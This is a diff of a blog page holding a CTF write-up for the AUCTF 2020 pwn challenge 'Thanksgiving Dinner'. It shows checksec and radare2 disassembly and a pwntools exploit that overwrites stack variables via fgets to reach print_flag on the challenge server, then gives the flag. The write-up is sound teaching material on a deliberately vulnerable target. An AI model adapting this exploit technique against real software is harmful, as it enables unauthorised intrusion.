@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head>
-         
+        
+
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <title>AUCTF 2020 Writeup - Thanksgiving Dinner</title>
@@ -39,13 +40,21 @@
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  
 
-
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-
-     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 
-
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/java.min.js"></script>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js"></script>
+    
     <script>hljs.initHighlightingOnLoad();</script>
-
 
 
 
@@ -59,39 +68,33 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.55.6" />
+ <meta name="generator" content="Hugo 0.72.0" />
         
 
         
 
         
+            <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
         
-        <script type="text/javascript" async
-          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-        </script>
+
         
+
     </head>
 
     <body>
-         
+        
+
         <nav class="navbar navbar-default navbar-fixed-top">
-
             <div class="container">
-
                 <div class="navbar-header">
-
                     <a class="navbar-brand visible-xs" href="#">AUCTF 2020 Writeup - Thanksgiving Dinner</a>
-
                     <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-
                 </div>
-
                 <div class="collapse navbar-collapse">
-
                     
                         <ul class="nav navbar-nav">
                             
@@ -107,7 +110,6 @@
                             
                         </ul>
                     
-
                     
                         <ul class="nav navbar-nav navbar-right">
                             
@@ -117,185 +119,137 @@
                             
                                 <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
+                                <li class="navbar-icon"><a href="/key.asc"><i class="fa fa-key"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
                             
                         </ul>
                     
-
                 </div>
-
             </div>
-
         </nav>
 
 
 <main>
 
-    <div class="item">
+    <div>
+        <h2>AUCTF 2020 Writeup - Thanksgiving Dinner</h2>
+        <h5>April 19, 2020</h5>
+        
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
 
-    
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
 
-    
-    
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
 
-    <h4><a href="/post/thanksgiving-dinner-auctf2020/">AUCTF 2020 Writeup - Thanksgiving Dinner</a></h4>
-    <h5>April 19, 2020</h5>
-    
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
 
-</div>
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
 
 
-    <br> <div class="text-justify">
+    </div>
 
-<h1 id="intro">Intro</h1>
-
+    <div align="left" class="content"><h1 id="intro">Intro</h1>
 <p>This is the second pwn challenge of AUCTF 2020. It was solved 238 times and it was worth 408 points.</p>
-
 <p>Description:</p>
-
 <blockquote>
-<p>I just ate a huge dinner. I can barley eat anymore&hellip; so please don&rsquo;t give me too much!</p>
-
+<p>I just ate a huge dinner. I can barley eat anymore… so please don’t give me too much!</p>
 <p>nc challenges.auctf.com 30011</p>
-
 <p>Note: ASLR is disabled for this challenge</p>
 </blockquote>
-
-<p>You could download the binary <a href="/ctf/binary/auctf2020/thanksgiving_dinner">here</a>.</p>
-
-<pre><code class="language-shell">$ sha256sum ./thanksgiving_dinner
+<p>You could download the binary <a href="/ctf/auctf2020/binary/thanksgiving_dinner">here</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sha256sum ./thanksgiving_dinner
 2307af59beead6a2377c3beb2ff26f70d5732ec6b651b5c31e58b8f692bfb70c thanksgiving_dinner
-</code></pre>
-
-<h1 id="exploitation">Exploitation</h1>
-
+</code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>The program simply ask for an input. But it seems not vulnerable to a buffer overflow:</p>
-
-<pre><code class="language-shell">$ ./thanksgiving_dinner
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./thanksgiving_dinner
 Hi!
-Welcome to my program... it's a little buggy...
-Hey I heard you are searching for flags! Well I've got one. :)
+Welcome to my program... it<span style="color:#e6db74">&#39;s a little buggy...
+</span><span style="color:#e6db74">Hey I heard you are searching for flags! Well I&#39;</span>ve got one. :<span style="color:#f92672">)</span>
 Here you can have part of it!
-auctf{
+auctf<span style="color:#f92672">{</span>
 
-Sorry that's all I got!
+Sorry that<span style="color:#960050;background-color:#1e0010">&#39;</span>s all I got!
 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-</code></pre>
-
-<p>So I checked the binary with checksec. Then I opened with radare2.</p>
-
-<pre><code class="language-shell">$ checksec ./thanksgiving_dinner
+</code></pre></div><p>So I checked the binary with checksec. Then I opened with radare2.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ checksec ./thanksgiving_dinner
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
 $ r2 -Ad ./thanksgiving_dinner
-</code></pre>
-
-<p>Then I found two promising functions:</p>
-
-<pre><code class="language-shell">[r2]&gt; afl
+</code></pre></div><p>Then I found two promising functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 .....
-0x56556250    7 198          sym.vulnerable
-0x56556360    3 162          sym.print_flag
+0x56556250    <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">198</span>          sym.vulnerable
+0x56556360    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">162</span>          sym.print_flag
 ....
-[r2]&gt; axt sym.vulnerable
-main 0x5655623c [CALL] call sym.vulnerable
-[r2]&gt; axt sym.print_flag
-sym.vulnerable 0x5655630b [CALL] call sym.print_flag
-</code></pre>
-
-<p>The <code>vulnerable</code> function is called by <code>main</code>. The <code>print_flag</code> function is called by <code>vulnerable</code>.</p>
-
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; axt sym.vulnerable
+main 0x5655623c <span style="color:#f92672">[</span>CALL<span style="color:#f92672">]</span> call sym.vulnerable
+<span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; axt sym.print_flag
+sym.vulnerable 0x5655630b <span style="color:#f92672">[</span>CALL<span style="color:#f92672">]</span> call sym.print_flag
+</code></pre></div><p>The <code>vulnerable</code> function is called by <code>main</code>. The <code>print_flag</code> function is called by <code>vulnerable</code>.</p>
 <p>So here is the interesting part about the latter.</p>
-
 <p>It gets an input a string and if some values are correct <code>print_flag</code> is called. Thanks the <code>fgets</code> we can overwrite those variables easily:</p>
-
-<pre><code class="language-shell">[r2]&gt; pdf @sym.vulnerable
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.vulnerable
 .....
-│           0x565562d9      6a24           push 0x24                   ; 36
-│           0x565562db      8d45d4         lea eax, [var_2ch]
-│           0x565562de      50             push eax
+│           0x565562d9      6a24           push 0x24                   ; <span style="color:#ae81ff">36</span>
+│           0x565562db      8d45d4         lea eax, <span style="color:#f92672">[</span>var_2ch<span style="color:#f92672">]</span>
+│           0x565562de      <span style="color:#ae81ff">50</span>             push eax
 │           0x565562df      e85cfdffff     call sym.imp.fgets
 │           0x565562e4      83c410         add esp, 0x10
-│           0x565562e7      817df4371300.  cmp dword [var_ch], 0x1337
-│       ┌─&lt; 0x565562ee      7520           jne 0x56556310
-│       │   0x565562f0      837df0ec       cmp dword [var_10h], 0xffffffec
+│           0x565562e7      817df4371300.  cmp dword <span style="color:#f92672">[</span>var_ch<span style="color:#f92672">]</span>, 0x1337
+│       ┌─&lt; 0x565562ee      <span style="color:#ae81ff">7520</span>           jne 0x56556310
+│       │   0x565562f0      837df0ec       cmp dword <span style="color:#f92672">[</span>var_10h<span style="color:#f92672">]</span>, 0xffffffec
 │      ┌──&lt; 0x565562f4      7d1a           jge 0x56556310
-│      ││   0x565562f6      837de814       cmp dword [var_18h], 0x14
-│     ┌───&lt; 0x565562fa      7414           je 0x56556310
-│     │││   0x565562fc      817dec637466.  cmp dword [var_14h], 0x667463
+│      ││   0x565562f6      837de814       cmp dword <span style="color:#f92672">[</span>var_18h<span style="color:#f92672">]</span>, 0x14
+│     ┌───&lt; 0x565562fa      <span style="color:#ae81ff">7414</span>           je 0x56556310
+│     │││   0x565562fc      817dec637466.  cmp dword <span style="color:#f92672">[</span>var_14h<span style="color:#f92672">]</span>, 0x667463
 │    ┌────&lt; 0x56556303      750b           jne 0x56556310
-│    ││││   0x56556305      837de42a       cmp dword [var_1ch], 0x2a
-│   ┌─────&lt; 0x56556309      7505           jne 0x56556310
+│    ││││   0x56556305      837de42a       cmp dword <span style="color:#f92672">[</span>var_1ch<span style="color:#f92672">]</span>, 0x2a
+│   ┌─────&lt; 0x56556309      <span style="color:#ae81ff">7505</span>           jne 0x56556310
 │   │││││   0x5655630b      e850000000     call sym.print_flag
-│   └└└└└─&gt; 0x56556310      90             nop
-│           0x56556311      8b5dfc         mov ebx, dword [var_4h]
+│   └└└└└─&gt; 0x56556310      <span style="color:#ae81ff">90</span>             nop
+│           0x56556311      8b5dfc         mov ebx, dword <span style="color:#f92672">[</span>var_4h<span style="color:#f92672">]</span>
 │           0x56556314      c9             leave
 └           0x56556315      c3             ret
-</code></pre>
+</code></pre></div><p>So this is my exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
 
-<p>So this is my exploit:</p>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<pre><code class="language-python">#!/usr/bin/python2
+prog <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(os<span style="color:#f92672">.</span>getcwd() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/turkey&#34;</span>, checksec<span style="color:#f92672">=</span>False)
 
-from pwn import *
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;challenges.auctf.com&#34;</span>
+        port <span style="color:#f92672">=</span> <span style="color:#ae81ff">30011</span>
+        t <span style="color:#f92672">=</span> remote(host, port)
+<span style="color:#66d9ef">else</span>:
+        t <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>process()
 
-prog = context.binary = ELF(os.getcwd() + &quot;/turkey&quot;, checksec=False)
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x2a</span>)       <span style="color:#75715e"># var_1ch</span>
+payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x15</span>)       <span style="color:#75715e"># var_18h</span>
+payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x667463</span>)   <span style="color:#75715e"># var_14h</span>
+payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0xffffffeb</span>) <span style="color:#75715e"># var_10h</span>
+payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x1337</span>)     <span style="color:#75715e"># var_ch</span>
 
-if len(sys.argv) &gt; 1:
-        host = &quot;challenges.auctf.com&quot;
-        port = 30011
-        t = remote(host, port)
-else:
-	t = prog.process()
-
-offset = 16
-payload = &quot;A&quot;*offset
-payload += pack(0x2a)       # var_1ch
-payload += pack(0x15)       # var_18h
-payload += pack(0x667463)   # var_14h
-payload += pack(0xffffffeb) # var_10h
-payload += pack(0x1337)     # var_ch
-
-t.sendline(payload)
-t.interactive()
-t.close()
-</code></pre>
-
-<p>And this is the flag:</p>
-
-<pre><code class="language-shell">$ cat flag.txt
-auctf{I_s@id_1_w@s_fu11!}
-</code></pre>
-
-<p><img src="/images/auctf2020/thanksgiving_dinner/solved.png" alt="thanksgiving dinner solved banner" /></p>
+t<span style="color:#f92672">.</span>sendline(payload)
+t<span style="color:#f92672">.</span>interactive()
+t<span style="color:#f92672">.</span>close()
+</code></pre></div><p>And this is the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat flag.txt
+auctf<span style="color:#f92672">{</span>I_s@id_1_w@s_fu11!<span style="color:#f92672">}</span>
+</code></pre></div><p><img src="/ctf/auctf2020/images/thanksgiving-dinner-solved.png" alt="thanksgiving dinner solved banner"></p>
 </div>
 
     
     
-
     
-
         <h4 class="page-header">Related</h4>
-
          <div class="item">
 
     
@@ -308,16 +262,17 @@ auctf{I_s@id_1_w@s_fu11!}
     <h4><a href="/post/pick-up-that-can-auctf2020/">AUCTF 2020 Writeup - Pick Up That CAN</a></h4>
     <h5>May 1, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/can-bus"><kbd class="item-tag">can-bus</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -332,16 +287,17 @@ auctf{I_s@id_1_w@s_fu11!}
     <h4><a href="/post/remote-school-auctf2020/">AUCTF 2020 Writeup - Remote School</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
   <div class="item">
@@ -356,32 +312,36 @@ auctf{I_s@id_1_w@s_fu11!}
     <h4><a href="/post/password-cracking-challenges-auctf2020/">AUCTF 2020 Writeup - Password Cracking Challenges</a></h4>
     <h5>April 20, 2020</h5>
     
-    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
-    
-    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
-    
+<a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/password"><kbd class="item-tag">password</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/cracking"><kbd class="item-tag">cracking</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/hashcat"><kbd class="item-tag">hashcat</kbd></a>
+
+<a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
+
+
 
 </div>
  
-
     
 
+    
     
 
 </main>
 
         <footer>
-
-            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
-
+            <p class="copyright text-muted">© All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>.</p>
         </footer>
-       
+
+        
+
+        
     </body>
 
 </html>
